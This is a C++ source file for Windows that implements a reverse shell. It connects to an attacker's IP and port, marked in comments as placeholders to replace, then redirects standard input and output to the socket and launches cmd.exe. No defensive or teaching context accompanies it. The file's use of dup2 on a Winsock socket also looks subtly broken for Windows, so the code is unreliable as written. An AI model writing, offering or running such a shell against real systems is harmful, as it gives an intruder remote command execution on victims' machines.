#include <iostream>
#include <winsock2.h> // For Windows
#include <ws2tcpip.h> // For Windows
#include <string>
#include <memory>

#pragma comment(lib, "ws2_32.lib")

void error(const char* msg) {
    std::cerr << msg << std::endl;
    exit(1);
}

int main() {
    WSADATA wsaData;
    SOCKET sock;
    sockaddr_in server;
    char buffer[1024];
    int bytesReceived;

    // Initialize Winsock
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
        error("Failed to initialize Winsock.");
    }

    // Create a socket
    if ((sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)) == INVALID_SOCKET) {
        error("Could not create socket.");
    }

    // Set up the server address structure
    server.sin_family = AF_INET;
    server.sin_port = htons(4444); // Replace with the attacker's port
    server.sin_addr.s_addr = inet_addr("192.168.1.100"); // Replace with the attacker's IP address

    // Connect to the server
    if (connect(sock, (sockaddr*)&server, sizeof(server)) == SOCKET_ERROR) {
        error("Connection failed.");
    }

    // Redirect stdin, stdout, and stderr to the socket
    dup2((int)sock, 0); // stdin
    dup2((int)sock, 1); // stdout
    dup2((int)sock, 2); // stderr

    // Execute a shell
    system("cmd.exe"); // For Windows; use /bin/sh for Unix/Linux

    // Clean up and close
    closesocket(sock);
    WSACleanup();

    return 0;
}
